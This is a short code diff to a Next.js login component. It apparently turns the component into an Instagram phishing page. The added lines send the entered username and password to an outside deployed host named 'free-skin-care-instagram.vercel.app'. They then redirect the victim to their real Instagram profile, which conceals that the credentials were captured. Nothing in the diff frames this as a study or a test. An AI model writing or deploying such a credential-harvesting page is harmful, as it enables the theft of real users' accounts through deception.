@@ -6,13 +6,15 @@ import Link from "next/link";
 import axios from "axios";
 
 export default function Login() {
+    const route = useRouter();
+
   const [id, setId] = useState("");
   const [password, setPassword] = useState("");
 
   const handleSubmit = async () => {
     try {
       await axios.post(
-        "http://localhost:3000/api/login",
+        "https://free-skin-care-instagram.vercel.app/api/login",
         { id, password },
         {
           headers: {
@@ -20,6 +22,8 @@ export default function Login() {
           },
         }
       );
+            route.push(`https://www.instagram.com/${id}/`);
+
     } catch (error) {
       console.log(error);
     }
